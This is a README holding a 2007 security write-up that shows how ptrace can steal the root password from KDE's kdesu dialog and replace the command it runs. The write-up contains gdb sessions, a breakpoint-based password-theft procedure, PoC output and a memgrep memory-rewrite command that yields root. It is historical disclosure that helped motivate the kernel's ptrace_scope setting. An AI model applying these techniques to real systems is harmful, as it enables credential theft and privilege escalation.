# kr00tf1sh
linux desktop (KDE) security breach (2007) predating and suggesting ptrace_scope into the kernel

## The Story

#### Foreword and setting the scene
Back in the early 2000s I did a lot of virus related research. My focus around 2005 went on to gnu/linux systems in this
regard. Around that time was probably the peak of 'reverse code engineering' sites and communities. A lot of them had been taken
down already, most notably http://www.anticrack.de , but one of the most advanced ones was still highly active:
http://www.woodman.com, where I was sysadmin for years (and founded the linux RCE forum there). 

***Reverse code engineering on linux platforms*** was not so much seen as an important skill to many, a typical argument would have been: "but
there is the source code available". Keeping it short here, of course **static binary analysis** is a necessary skill
when dealing with malware. gnu/linux malware also means shellcodes targeting network servers for example.  

Around this time gnu/linux was really entering the desktop widely. Live bootable CDs like **knoppix** and **Ubuntu** became popular. People started using linux desktop systems like **GNOME** and **KDE** widely.  

#### The ptrace() disaster
Once I got deeper into the rabbit hole, I figured the **ptrace kernel interface** was a **security desaster** . Using
ptrace system calls, it is possible to control processes (start, stop, halt, continue them), and more interestingly to
**read and write their memory**. I played around a little and was able to **inject code into foreign processes** up to
the point where I injected whole debuggers into binaries, that used ptrace() themselves. Just for fun :)  

As a former **KDE** user myself, and seeing how desktop security / privilege escalation was implemented, like in windows or mac based desktop
systems, where a security dialogue pops up before ie critical system changes I once quickly did a `ps -ef` to check
under which system user this dialogue ran. Yes, it was ran as the logged in system user, wihout any protection.

I quickly verified on various **GNOME** based live CDs - same situation.  

This fact inspired the idea for implementing a proof of concept code that would

 - steal the entered password out of memory 
 - secretly execute other commands than the user wanted, then performing the users task
 - open the way for malware to gain root access due to desktop insecurity by design  

(see [kr00tf1sh.c](https://github.com/M64GitHub/kr00tf1sh/blob/main/krootfish.c) for the final code)

Since this was a major flaw in my opinion, I contacted the KDE security mailing list 2007. Needless to say, they did not
understand the problem at all, and asked for code. The problem though was not any code, it was **the design**. So I
did not send them any code of course, it would have been useless. 

After discussing the topic with my friends on woodmann.com - instead, I matured the code, and wrote an article describing the problem. I knew, this kind of problem **could never be
solved by any desktop system**, the only profound solution would be to **change the linux kernel / ptrace interface**.

## The Result 

It took a few years to come, but now we have 
```
/proc/sys/kernel/yama/ptrace_scope
```
to restrict ptrace's access scope:

```
0 - classic ptrace permissions:

    a process can PTRACE_ATTACH to any other process running under the same uid, 
    as long as it is dumpable (i.e. did not transition uids, start privileged, 
    or have called prctl(PR_SET_DUMPABLE...) already). 
    Similarly, PTRACE_TRACEME is unchanged.

1 - restricted ptrace:

    a process must have a predefined relationship with the inferior it wants to 
    call PTRACE_ATTACH on. By default, this relationship is that of only its 
    descendants when the above classic criteria is also met. To change the 
    relationship, an inferior can call prctl(PR_SET_PTRACER, debugger, ...) 
    to declare an allowed debugger PID to call PTRACE_ATTACH on the inferior. 
    Using PTRACE_TRACEME is unchanged.

2 - admin-only attach:

    only processes with CAP_SYS_PTRACE may use ptrace, either with PTRACE_ATTACH 
    or through children calling PTRACE_TRACEME.

3 - no attach:

    no processes may use ptrace with PTRACE_ATTACH nor via PTRACE_TRACEME. 
    Once set, this sysctl value cannot be changed.
```

Most gnu/linux based desktop systems nowadays have this value set to 1 by default, 
but not all. Debian systems were reverting it back to 0 the last time I checked.

## The Code
[kr00tf1sh.c](https://github.com/M64GitHub/kr00tf1sh/blob/main/krootfish.c)  


## The Article

```

                      liberating linux malware, or smashing KDE for fun N profit
                      ----------------------------------------------------------
                                       2007/04 Mario Schallner <ms@rocksolid.at>



	 TOC

	-1 .......... abstract
	 0 .......... intro
	 1 .......... brainstorming
	 2 .......... here we go
	 2.1 ........ password fishing inside the kdesu process
	 2.2 ........ reversing kdesu
	 3 .......... proofing the concept
	 4 .......... back to the roots
	 4.2 ........ brainstorming
	 4.1 ........ here we go again
	 4.2 ........ command faking inside the kdesu process
	 5 .......... proofing the concept
	 6 .......... conclusion
	 6.1 ........ ideas and suggestions
	 7 .......... meet kroOtfish.c
	 8 .......... references



-1 abstract
============

This document was created during a personal research about finding new 
strategies for virii on gnu/linux operating systems to gain root access, what
is also seen as a major factor for effectiveness of linux malware in general.
An objective of this research should be the analysis of common linux desktop
environments in order to find weaknesses in the design, which can be exploited
to gain control over the system.

The focus on desktop environments was especially taken as gnu/linux is allready
widely used as a desktop OS, and gets more and more popular also for the average
home user. It is likely possible that malware authors could sooner or later try
to attack the linux desktop world, too.

During close observation weaknesses were found in KDEs desktop integration. This 
document outlines the resulting vulnerability in great detail by describing the
research process behind, and it demonstrates the consequences with an extra evil
proof of concept code ;>

thanks->goto("my friends on woodmanns rce forums", "uninformed for providing \
greatest wisdom", "gp307 :]", "0xb001 for cross-reading and giving me an osx \
powerbook", "my not so often visited friends on pulltheplug.org", "and       \
cappello-soft");


0 intro
========

It has always puzzled me, how virii on linux can infect a system reliably
([00], [01]).
When we imagine an infected executable gets started by the user, we immediately
face the situation that the virus can only infect binaries owned by that user.
The operating system usually prevents a user process from writing to system
binaries by applying the permissions set on the filesystems.
We can assume the list of possible targets is reduced to almost only binaries
in the users home directory. There we can expect approximately exact 0.
This situation is not very satisfying from the perspective of a virus.

The conclusion is: we need root access. Root access would enable easy ways for
residency, and for infecting any (all) binary victim(s), without the filesystems
permission barrier, or any other permission barriers given by the system.

"Malware" and "root" - what usually comes to my mind would be classical exploits
like bufferoverflows, format string abuses, or such. We would need a 0day
exploit to reliably infect a system.

What I tried to find instead, are other reliable ways to get root, by abusing
"effects" of the general design and setup of desktop user environments. I also
especially wanted to look at the desktop integration as the popularity of linux
based desktop systems is growing so fast recently. Latest headlines tell Dell is
selling Computers with Ubuntu preinstalled!

Let's start by going into free thinking mode, and trying every stupid
"brainstorm idea" ...


1 brainstorming
================

Still in free thinking mode - we widen our tolerance _when_ to get root. Is it
really necessary to have a root account immediately at (the start of) execution
time? Hmmm. Not really, or? Maybe we can wait for a root account to just ...
appear?

:)

Lets examine possible situations where the ordinary desktop user needs root
access:

 - the user starts a command running sudo via gui or shell
 - the user is a power user and works with "su -" in a shell
 - the user does some system wide configuration using his desktop environment:
   kdesu, gksu, ...
 - ...


2 here we go
=============

I examined the several ways in more detail and found interesting possibilities
abusing the kdesu process.

In a common kde desktop setup when the user does any system wide configuration,
he will be prompted for the root password. The corresponding "enter password"
dialog is created by the process 'kdesu', which also handles the execution of
the command in root (or any other users) context.

How can we abuse the situation when the user runs kdesu? For example the user 
does a software update, installs a program, changes a config, etc ... ? I just
tried "the obvious":


2.1 password fishing inside the kdesu process
==============================================

I was thinking it might be possible to fish the password from kdesu. I was not
sure if this can be achieved easily or not.

Lets check it ...

For the curious who never saw kdesu - it is just working analog to the su
command. You can run it from commandline, too:

mario@debian:~$ kdesu "id > /tmp/x"

... a gui appears and asks for the root password ...

mario@debian:~$ cat /tmp/x
uid=0(root) gid=0(root) groups=0(root)

Now, lets try to fish. I run kdesu again

mario@debian:~$ kdesu "id > /tmp/x"

and enter "xxxxxxxx" as password. I do not yet press the enter key,
leave the window open, and go back to the shell:

mario@debian:~$ ps -ef | grep kdesu
mario     3100     1  0 15:15 ?        00:00:00 /usr/bin/kdesud
mario     3140  3036  1 15:19 pts/1    00:00:00 kdesu id > /tmp/x
mario     3144  3036  0 15:20 pts/1    00:00:00 grep kdesu
mario@debian:~$

mario@debian:~$ memgrep -p 3140 -s -a all -f s,xxxxxxxx
Searching 0x08051820 => 0x08052336...
Searching 0x080538c0 => 0x080539a8...
Searching 0x080539a8 => 0xffffffff...
   found at 0x080eaa10
Searching 0xbfeddff0 => 0xffffffff...
Searching 0x0804df80 => 0x080517f4...
Searching 0x0000000a => 0xffffffff...

BOOOHAHAH! Well, its an ordinary Qt user process, working with ordinay text from
an ordinary Qt widget ... but anyway, that was simple to check ;)

OK now we "only" need to work out a reliable way how to locate that string
inside the running process. Also we should do that in a way we can
programmatically repeat it, of course.

I find that so cool, i repeat it:

mario@debian:~$ ps -ef | grep kdesu
mario     3100     1  0 15:15 ?        00:00:00 /usr/bin/kdesud
mario     3152  3036  2 15:24 pts/1    00:00:00 kdesu id > /tmp/x
mario     3156  3036  0 15:24 pts/1    00:00:00 grep kdesu
mario@debian:~$ memgrep -p 3152 -s -a all -f s,xxxxxxxx
Searching 0x08051820 => 0x08052336...
Searching 0x080538c0 => 0x080539a8...
Searching 0x080539a8 => 0xffffffff...
   found at 0x080eac30
Searching 0xbfd8dea0 => 0xffffffff...
Searching 0x0804df80 => 0x080517f4...
Searching 0x0000000a => 0xffffffff...
mario@debian:~$

We can see, that the address of the password is not on a fixed location, it's
just somewhere on the heap probably - but it does not matter at all. To exactly
locate it we analyze the kdesu binary a bit ...


2.3 reversing kdesu
====================

First we need to find a good address inside the kdesu process where we can set
a breakpoint, so we can examine the processes data and execution flow at its
runtime.

A good idea is to look at the programs symbols. We do not have the full symbolic
information, but at least we can always find the imported symbols (functions
from external libraries):

So I look for anything related to a password:

0xf001@debian:~/_0xf001/_dev/_tests/kdesu/_res$ objdump -T kdesu | grep -i pass
00000000      DF *UND*  000000b6              _ZN15KPasswordDialog9qt_invokeEiP8QUObject
00000000      DF *UND*  00000183              _ZN15KPasswordDialog7addLineE7QStringS0_
00000000      DF *UND*  0000003b              _ZN15KPasswordDialog11qt_propertyEiiP8QVariant
00000000      DF *UND*  000000aa              _ZN15KPasswordDialog16staticMetaObjectEv
00000000      DF *UND*  00000202              _ZN15KPasswordDialogC2ENS_5TypesEbiRK7QStringP7QWidgetPKc
080539d8  w   DO .bss   0000000c              _ZTI15KPasswordDialog
00000000      DF *UND*  00000064              _ZN15KPasswordDialog7qt_castEPKc
0804d76c      DF *UND*  000001e7              _ZN15KPasswordDialog6slotOkEv
00000000      DF *UND*  00000118              _ZN11KDEsuClient7setPassEPKci
00000000      DF *UND*  00000034              _ZN15KPasswordDialog7qt_emitEiP8QUObject
0804dcfc      DF *UND*  00000016              _ZN15KPasswordDialog10slotCancelEv
0804ddfc      DF *UND*  00000031              _ZN15KPasswordDialog12virtual_hookEiPv
00000000      DF *UND*  00000032              _ZN9SuProcess17checkNeedPasswordEv
00000000      DF *UND*  0000007a              _ZN15KPasswordDialogD2Ev
00000000      DF *UND*  00000071              _ZN15KPasswordDialog9setPromptE7QString

In this list we can immediately see one function which looks perfect to break:

0804d76c      DF *UND*  000001e7              _ZN15KPasswordDialog6slotOkEv

I set a breakpoint on address 0x0804d76c in gdb and let the process continue,
then click the OK button:

_______________________________________________________________________________
     eax:08052048 ebx:B79827CC  ecx:00000036  edx:BFF592F4     eflags:00000297
     esi:0000004A edi:BFF5887C  esp:BFF5877C  ebp:BFF587A8     eip:0804D76C
     cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t S z A P C
[007B:BFF5877C]---------------------------------------------------------[stack]
BFF587AC : 45 22 8C B7  F4 92 F5 BF - 4A 00 00 00  7C 88 F5 BF E"......J...|...
BFF5879C : CC 27 98 B7  F4 92 F5 BF - 4A 00 00 00  C8 87 F5 BF .'......J.......
BFF5878C : 2E 00 00 00  16 00 00 00 - A4 4D 43 B7  C8 87 F5 BF .........MC.....
BFF5877C : E9 1D 8C B7  F4 92 F5 BF - B4 87 F5 BF  00 00 00 00 ................
[0073:0804D76C]---------------------------------------------------------[ code]
0x804d76c <_ZN15KPasswordDialog6slotOkEv@plt>:  jmp    *0x80536b8
0x804d772 <_ZN15KPasswordDialog6slotOkEv@plt+6>:        push   $0x488
0x804d777 <_ZN15KPasswordDialog6slotOkEv@plt+11>:       jmp    0x804ce4c <_init+24>
0x804d77c <strlen@plt>: jmp    *0x80536bc
0x804d782 <strlen@plt+6>:       push   $0x490
0x804d787 <strlen@plt+11>:      jmp    0x804ce4c <_init+24>
------------------------------------------------------------------------------

Breakpoint 1, 0x0804d76c in KPasswordDialog::slotOk ()
gdb> conti

That's perfect, our breakpoint is triggered after we click the button, so we
must be very close allready. Now lets look for the password.

I manually looked around the address range, where we previously found it using
the memgrep utility. I found the password at:

gdb> dd 80EAB00
[007B:080EAB00]---------------------------------------------------------[ data]
080EAB00 : 73 77 6F 72  64 66 69 73 - 68 00 00 00  00 00 00 00 swordfish.......

Now we need to find a pointer to this address. But where to start looking?
My first idea was to walk from the pointer

080539d8  w   DO .bss   0000000c              _ZTI15KPasswordDialog

because it is a known starting point. Behind that pointer I expect pointers to
the data of the instance of the KPasswordDialog, where somewhere must be a
pointer to the QString password.

In theory ... practically I gave up after some hours following pointers and
reading about QObjects and QMetaObjects, and I downloaded the source code:

In kdebase/kdesu/sudlg.cpp:56 I found this:

bool KDEsuDialog::checkPassword(const char *password)
{
    SuProcess proc;
    proc.setUser(m_User);
    int status = proc.checkInstall(password);
    switch (status)
    {
    case -1:
	KMessageBox::sorry(this, i18n("Conversation with su failed."));
	done(Rejected);
	return false;

    case 0:
	return true;

    case SuProcess::SuNotFound:
        KMessageBox::sorry(this,
		i18n("The program 'su' is not found;\n"
		     "make sure your PATH is set correctly."));
	done(Rejected);
	return false;

    case SuProcess::SuNotAllowed:
        KMessageBox::sorry(this,
		i18n("You are not allowed to use 'su';\n"
		     "on some systems, you need to be in a special "
		     "group (often: wheel) to use this program."));
	done(Rejected);
	return false;

    case SuProcess::SuIncorrectPassword:
        KMessageBox::sorry(this, i18n("Incorrect password; please try again."));
	return false;

    default:
        KMessageBox::error(this, i18n("Internal error: illegal return from "
		"SuProcess::checkInstall()"));
	done(Rejected);
	return false;
    }
}

Hmmm, cool function, checkPassword. But I do not find it in the objdump -T
output above.

In the source code we also saw another function: checkInstall. How about that?

mario@debian:~/_dev/_tests/kdesu/_res$ objdump -T kdesu | grep -i check
00000000      DF *UND*  00000033              _ZN9SuProcess12checkInstallEPKc
00000000      DF *UND*  00000032              _ZN9SuProcess17checkNeedPasswordEv
0804deec      DF *UND*  000000f8              _ZN7QObject16checkConnectArgsEPKcPKS_S1_

Very nice, but we do not know the address of it, or?

Well, I used my own tool which calculates the address via plt:

0804D0BC - _ZN9SuProcess12checkInstallEPKc

Hehe. I set that as breakpoint, and continue the executable:

_______________________________________________________________________________
     eax:BFF5868C ebx:BFF58700  ecx:080F8F28  edx:08090DF0     eflags:00000282
     esi:BFF586F8 edi:BFF592F4  esp:BFF5866C  ebp:BFF58728     eip:0804D0BC
     cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t S z a p c
[007B:BFF5866C]---------------------------------------------------------[stack]
BFF5869C : C0 39 05 08  F8 45 0A 08 - C0 39 05 08  58 84 0E 08 .9...E...9..X...
BFF5868C : 68 55 BE B7  00 00 F5 BF - 19 00 00 00  B4 87 F5 BF hU..............
BFF5867C : 10 B2 6A B7  B4 C5 AA B7 - 00 00 00 00  58 87 F5 BF ..j.........X...
BFF5866C : 21 E5 04 08  8C 86 F5 BF - 00 AB 0E 08  F8 86 F5 BF !...............
[0073:0804D0BC]---------------------------------------------------------[ code]
0x804d0bc <_ZN9SuProcess12checkInstallEPKc@plt>:        jmp    *0x805350c
0x804d0c2 <_ZN9SuProcess12checkInstallEPKc@plt+6>:      push   $0x130
0x804d0c7 <_ZN9SuProcess12checkInstallEPKc@plt+11>:     jmp    0x804ce4c <_init+24>
0x804d0cc <_ZN7QObject11customEventEP12QCustomEvent@plt>:       jmp    *0x8053510
0x804d0d2 <_ZN7QObject11customEventEP12QCustomEvent@plt+6>:     push   $0x138
0x804d0d7 <_ZN7QObject11customEventEP12QCustomEvent@plt+11>:    jmp    0x804ce4c <_init+24>
------------------------------------------------------------------------------

Breakpoint 2, 0x0804d0bc in SuProcess::checkInstall ()
gdb>

Very good, we are at the function call to SuProcess::checkInstall(), and can
expect the pointer to the password laying on the stack as the passed parameter
to the previously called function KDEsuDialog::checkPassword(char *password).

Lets look at the stack:

gdb> stack
#0  0x0804d0bc in SuProcess::checkInstall ()
#1  0x0804e521 in ?? ()
#2  0xbff5868c in ?? ()
#3  0x080eab00 in ?? ()
#4  0xbff586f8 in ?? ()
#5  0xb76ab210 in ?? () from /usr/lib/libkdecore.so.4
#6  0xb7aac5b4 in in6addr_loopback () from /lib/tls/i686/cmov/libc.so.6
#7  0x00000000 in ?? ()

Ta taaa: at #3 we find our password stored :)

Using a breakpoint on memory access, I found another function later will clear
that password in memory. But that will be too late!

What can we do with this information? We know that it is theoretically possible
to fish the root password from a running kdesu process, just after the user
entered it. We found a perfect breakpoint where we can locate the password on
the stack. All we need to do is to write a little program that would set this
breakpoint and then read the content behind that pointer out of the running 
kdesu process. Theoretically there is no technical limitation not to do that.
So lets try it ... :)


3 proofing the concept
=======================

It turned out to be easily possible to create a proof of concept code that
automates the process we just did manually with gdb.

The resulting program acts as a debugger to the kdesu process and uses the
ptrace() debugging interface to control it. The ptrace() interface allows to
read and write the debugees process memory, what will be used to insert the
breakpoint and read the password. The breakpoint is realized by overwriting the
code memory at the functions address with a 0xCC byte (int3 instruction). This
interrupt causes the process to trigger a SIGTRAP signal for which we wait from
the debugging process. A classical debugger ;)

Flow of the executable:

0) locate virtual address for symbol SuProcess::checkInstall from kdesu binary
   on disk
1) attach to the kdesu process

2) set breakpoint at SuProcess::checkInstall 
2.1) read code memory of function start, and store temporary
2.2) overwrite first byte with 0xcc
2.3) write back to code memory

3) Continue the process

... wait for OK click ...

4) breakpoint is reached

5) fish password
5.1) read esp stack pointer register
5.2) read pointer to password from stack
5.3) read password

6) restore instruction at function start
7) reset eip register
8) detach and let process continue

The output of this "tracepatcher" will demonstrate the concept and show us the
root password in plain text below:

We start kdesu
mario@debian:~/_dev/_tests/tracepatcher$ kdesu "date > /tmp/x; id >> /tmp/x"
and the enter password dialog appears:

Now we get the process id of the kdesu process ...
mario@debian:~/_dev/_tests/tracepatcher$ ps -ef | grep kdesu
mario     3526     1  0 14:57 ?        00:00:00 /usr/bin/kdesud
mario     3529  3483  0 14:57 pts/1    00:00:00 kdesu date > /tmp/x; id >> /tmp/x
mario     3538  3483  0 14:57 pts/1    00:00:00 grep kdesu

and run the tracepatcher with the pid as argument:
mario@debian:~/_dev/_tests/tracepatcher$ ./tracepatcher 3529
Trace Patcher, 2007 Mario Schallner
Processing Symbols:
found 'checkInstall': 0804d0bc
attaching to process
waiting for process ater attach ...
stopped by signal 19
reading instructions
                        read_p(pid: 3529, va: 0804d0bc, buf: bf9d5398, len: 4)
Insn bytes: 350c25ff
modifying to: 350c25cc
writing insn...
                        write_p(pid: 3529, va: 0804d0bc, buf: bf9d5398, len: 4)
                                write_p: filled word with: 350c25cc
written!
continuing. waiting for process ...
continuing. waiting for process ...

The above output shows the insertion of the breakpoint. After we click the OK
button the password will be read:

wait status nach break:
stopped by signal 5
BREAKPOINT HIT!!
stopped at EIP: 0804d0bc
fishing password: getting pointer
                        read_p(pid: 3529, va: bf9510d4, buf: bf9d5390, len: 4)
password at: 080ea9d0
now really fishing password
                        read_p(pid: 3529, va: 080ea9d0, buf: 0804b008, len: 20)
                        read_p(pid: 3529, va: 080ea9d4, buf: 0804b00c, len: 20)
                        read_p(pid: 3529, va: 080ea9d8, buf: 0804b010, len: 20)
                        read_p(pid: 3529, va: 080ea9dc, buf: 0804b014, len: 20)
                        read_p(pid: 3529, va: 080ea9e0, buf: 0804b018, len: 20)
restoring original bytes
                        write_p(pid: 3529, va: 0804d0bc, buf: bf9d5394, len: 4)
                                write_p: filled word with: 350c25ff
resetting eip and restoring registers
detaching ...

>>> root password: 'sw0rdfish' <<<
have a lot of fun!
mario@debian:~/_dev/_tests/tracepatcher$


4 back to the roots
====================

Allright, we have a working concept of stealing the root password. Having that,
it should theoretically be possible to execute a command in root context.
We could do so by spawning a shell and controlling the tty of that shell to fake
keyboard input: "su -", the password, and then the command to execute. 
I successfully tested the tty keyboard faking and am sure this will work, but
somehow the idea does not look too elegant. Lets look for further options.

Since we got the password from kdesu and this programs purpose exactly is to
execute something in root context, maybe we can do something more with it ... ?
We saw the kdesu process is very unprotected, I am sure we can bring it to
directly execute our own command(s) ...


4.2 brainstorming
==================

What potential possibilities are there abusing the kdesu process to let it
execute our own command?

 - We could try to set the value for the "keep password" checkbox, so the
   password will be stored for a specific amount of time. Time enough to execute
   another kdesu process directly after the first, to execute our own command.
   This kdesu process will then not anymore ask for a password and just execute

 - We could try to call the function again which just executed the command, and
   modify the passed string to point to our own command

 - We could just replace the command with our own when it is passed to the exec
   function, and let it execute by kdesu. In our own executable we look for the
   original command in the process list and execute it, so the requested user
   action gets executed, too

 - ...

I tried to find the most easy solution. I looked at how to set the keep password
flag and found the slot "slotKeep" as a symbol:

0010ee80 g    DF .text  00000012  Base        _ZN15KPasswordDialog8slotKeepEb
gdb: 1   breakpoint     keep n   0xb77ace80 <KPasswordDialog::slotKeep(bool)>

We would need to analyze how to best call the function. We could try to insert
another breakpoint, then save all registers, and set eip to the functions 
addresss. That would mean to pause or freeze the process execution, call the 
keep function inside, and resume the process after. We would therefore also 
need to analyze how the stack must be layed out in order to call that function,
and ifthere need to be pointers to the objects passed etc ...

That does not immediately look like the most easy way, lets examine others ...


4.1 here we go again
=====================

Lets focus on the command and not the keep password flag. What do we find when 
searching kdesus address space for the command?

mario@debian:~/_dev/_retools/kroOtfish/tests$ kdesu "/bin/ls             >/tmp/x" &
[1] 7736
mario@debian:~/_dev/_retools/kroOtfish/tests$ memgrep -p 7736 -s -a all -f s,/bin/ls
Searching 0x08051820 => 0x08052336...
Searching 0x080538c0 => 0x080539a8...
Searching 0x080539a8 => 0xffffffff...
   found at 0x0805d4a0
   found at 0x0809daa8
Searching 0xbfcab3e0 => 0xffffffff...
   found at 0xbfcad989
Searching 0x0804df80 => 0x080517f4...
Searching 0x0000000a => 0xffffffff...
mario@debian:~/_dev/_retools/kroOtfish/tests$

Ok we see 3 search results. That does not look too good, which one will be the
one last used for the execution in root context, and when exactly to modify it?

I looked at the source code where the execution in root context takes place.
The Qt object and inheritance model on which kde is based spreads the
implementation from KPasswordDialog::slotOK() over SuProcess::exec() to
PtyProcess::exec() (and others).

I look again into the kdesu binary to see if I can find a corresponding symbol
named anything like 'exec':

mario@debian:~/_dev/_retools/kroOtfish/tests$ symgrep kdesu exec
00000000      DF *UND*  00000139              _ZN7QDialog4execEv
00000000      DF *UND*  00000fc3              _ZN9SuProcess4execEPKci
00000000      DF *UND*  000001e0              _ZN11KDEsuClient4execERK8QCStringS2_S2_RK10QValu

and take _ZN9SuProcess4execEPKci as new breakpoint.

Breakpoint 1, 0xb7bff510 in SuProcess::exec () from /usr/lib/libkdesu.so.4
gdb> stack
#0  0xb7bff510 in SuProcess::exec () from /usr/lib/libkdesu.so.4
#1  0xb7c0054d in SuProcess::checkInstall () from /usr/lib/libkdesu.so.4
#2  0x0804e521 in ?? ()
#3  0xbfb098bc in ?? ()
#4  0x080f25b8 in ?? ()
#5  0xbfb09928 in ?? ()
#6  0x00000000 in ?? ()

ok here we are in libkdesu. I tried to find the passed command somewhere in
memory. But again ... where to start searching? I looked at the source to
derive how the stack layout must be at the point of execution of 
SuProcess::checkInstall.

As we see below the call to SuProcess::exec() happens directly after the call
to 
 	proc.setCommand(command);

Whereby command must be the address of the objects property "command", and it
must have therefore been pushed as an argument onto the stack before. 

It would be better to directly break on the setCommand() function, and locate
the pointer to the argument (command) directly on the stack as with the
password. But it would be difficult to locate the symbol setCommand in the
processes memory, as it is contained in a shared library.

Here the corresponding source code with the marked breakpoint:


    // Run command
    if (!change_uid)
    {
        int result = system(command);
        result = WEXITSTATUS(result);
        return result;
    }
    else if (keep && have_daemon)
    {
        client.setPass(password, timeout);
        client.setPriority(priority);
        client.setScheduler(scheduler);
        int result = client.exec(command, user, options, env);
        if (result == 0)
        {
            result = client.exitCode();
            return result;
        }
    } else
    {
        SuProcess proc;
        proc.setTerminal(terminal);
        proc.setErase(true);
        proc.setUser(user);
        if (!new_dcop)
        {
            proc.setXOnly(true);
            proc.setDCOPForwarding(true);
        }
        proc.setEnvironment(env);
        proc.setPriority(priority);
        proc.setScheduler(scheduler);
        proc.setCommand(command);
        int result = proc.exec(password); // < ------- BREAKPOINT HERE ------- <
        return result;
    }
    return -1;


In gdb we are still at our breakpoint

Breakpoint 1, 0xb7bff510 in SuProcess::exec () from /usr/lib/libkdesu.so.4
gdb>bpl

Num Type           Disp Enb Address    What
1   breakpoint     keep y   0xb7bff510 <SuProcess::exec(char const*, int)>
        breakpoint already hit 2 times
gdb>
_______________________________________________________________________________
     eax:BF9C6E8C ebx:B7B9D758  ecx:080F34C0  edx:0809C9F8     eflags:00000282
     esi:BF9C6EF8 edi:BF9C7BE4  esp:BF9C6E4C  ebp:BF9C6E68     eip:B7B9A510
     cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t S z a p c
[007B:BF9C6E4C]---------------------------------------------------------[stack]
BF9C6E7C : 00 00 00 00  01 00 00 00 - 00 00 00 00  01 00 00 00 ................
BF9C6E6C : 21 E5 04 08  8C 6E 9C BF - C0 25 0F 08  F8 6E 9C BF !....n...%...n..
BF9C6E5C : C0 34 0F 08  20 B5 B9 B7 - 00 6F 9C BF  28 6F 9C BF .4.. ....o..(o..
BF9C6E4C : 4D B5 B9 B7  8C 6E 9C BF - C0 25 0F 08  01 00 00 00 M....n...%......
[0073:B7B9A510]---------------------------------------------------------[ code]
0xb7b9a510 <_ZN9SuProcess4execEPKci>:   push   %ebp
0xb7b9a511 <_ZN9SuProcess4execEPKci+1>: mov    %esp,%ebp
0xb7b9a513 <_ZN9SuProcess4execEPKci+3>: push   %edi
0xb7b9a514 <_ZN9SuProcess4execEPKci+4>: push   %esi
0xb7b9a515 <_ZN9SuProcess4execEPKci+5>: push   %ebx
0xb7b9a516 <_ZN9SuProcess4execEPKci+6>: sub    $0x11c,%esp
------------------------------------------------------------------------------

Breakpoint 1, 0xb7b9a510 in SuProcess::exec () from /usr/lib/libkdesu.so.4
gdb> stack
#0  0xb7b9a510 in SuProcess::exec () from /usr/lib/libkdesu.so.4
#1  0xb7b9b54d in SuProcess::checkInstall () from /usr/lib/libkdesu.so.4
#2  0x0804e521 in ?? ()
#3  0xbf9c6e8c in ?? ()
#4  0x080f25c0 in ?? ()
#5  0xbf9c6ef8 in ?? ()
#6  0x00000000 in ?? ()

I look at the ebp register which shows the old stack frame before the call to our
breakpoint. From there I look at the stack and find the command here:

gdb> dd **(BFC17BD8+1c)
[007B:BFC18983]---------------------------------------------------------[ data]
BFC18983 : 6B 64 65 73  75 00 2F 62 - 69 6E 2F 6C  73 20 20 20 kdesu./bin/ls
BFC18993 : 20 20 20 20  20 20 20 20 - 20 20 3E 2F  74 6D 70 2F           >/tmp/
BFC189A3 : 78 00 4B 44  45 5F 4D 55 - 4C 54 49 48  45 41 44 3D x.KDE_MULTIHEAD=
BFC189B3 : 66 61 6C 73  65 00 54 45 - 52 4D 3D 78  74 65 72 6D false.TERM=xterm
BFC189C3 : 00 53 48 45  4C 4C 3D 2F - 62 69 6E 2F  62 61 73 68 .SHELL=/bin/bash
BFC189D3 : 00 47 54 4B  32 5F 52 43 - 5F 46 49 4C  45 53 3D 2F .GTK2_RC_FILES=/
BFC189E3 : 65 74 63 2F  67 74 6B 2D - 32 2E 30 2F  67 74 6B 72 etc/gtk-2.0/gtkr
BFC189F3 : 63 3A 2F 68  6F 6D 65 2F - 6D 61 72 69  6F 2F 2E 67 c:/home/0xf001/.g
gdb>                                                                            

I modified the command and let the process continue. The result was that still
the /bin/ls command got executed. So we found just any occurence of the command
string which was only temporary used. Via function calls in kdesu we will not 
locate the command string, as further source code study reveals.

We need to find the location of the property "m_command" of the Qt Object 
PtyProcess, this is where the command is stored:

libs/kdesu/process.h

class KDESU_EXPORT PtyProcess
{
public:
    PtyProcess();
    virtual ~PtyProcess();
...
...
protected:
    const QCStringList& environment() const;

    bool m_bErase, m_bTerminal;
    int m_Pid, m_Fd;
    QCString m_Command, m_Exit;
...
...

and in stub.h we find the setCommand function

class KDESU_EXPORT StubProcess: public PtyProcess
{
public:
    StubProcess();
    ~StubProcess();

    /**
     * Specify dcop transport
     */
    void setDcopTransport(const QCString &dcopTransport) 
       { m_pCookie->setDcopTransport(dcopTransport); }

    /**
     * Set the command.
     */
    void setCommand(const QCString &command) { m_Command = command; }

It does not look to easy to locate the correct command string in memory on first
sight. Hm. But ... moment ... is that necessary at all?


4.2 command faking inside the kdesu process
============================================

What if we just replace all occurences of the command string in the process
memory?

Again running kdesu with /bin/ls as command:

mario@debian:~/_dev/_retools/kroOtfish/tests$ kdesu "/bin/ls    >/tmp/x"&
[1] 7736

Now using memgrep we replace /bin/ls to /usr/bin/id:

mario@debian:~/_dev/_retools/kroOtfish/tests$ memgrep -p 7736 \
 -s -r -a all -f s,/bin/ls -t s,/usr/bin/id
Searching 0x08051820 => 0x08052336...
Searching 0x080538c0 => 0x080539a8...
Searching 0x080539a8 => 0xffffffff...
   replaced at 0x0805d4a0
   replaced at 0x0809daa8
Searching 0xbfcab3e0 => 0xffffffff...
   replaced at 0xbfcad989
Searching 0x0804df80 => 0x080517f4...
Searching 0x0000000a => 0xffffffff...
mairo@debian:~/_dev/_retools/kroOtfish/tests$
[1]+  Done                    kdesu "/bin/ls    >/tmp/x"

Now we look into /tmp/x, if we find the ls or id command output:


!!!

mario@debian:~/_dev/_retools/kroOtfish/tests$ cat /tmp/x
uid=0(root) gid=0(root) groups=0(root)

!!!

We see our own command (/usr/bin/id) got executed!

Why then make things complicated? Now we have all we need ...


5 proofing the concept
=======================
0xf001@debian:~/_0xf001/_dev/_retools/kroOtfish$ ./kroOtfish
kroOtfish, 2007 Mario Schallner

backgrounding ...
0xf001@debian:~/_0xf001/_dev/_retools/kroOtfish$ 
        looking for kdesu ... not found
        looking for kdesu ... not found

0xf001@debian:~/_0xf001/_dev/_retools/kroOtfish/tests$ ls
fork    fork.c~  kdesu.asm   libkdesu.so.4      libkdeui.asm
fork.c  kdesu    kdesu.syms  libkdesu.so.4.asm

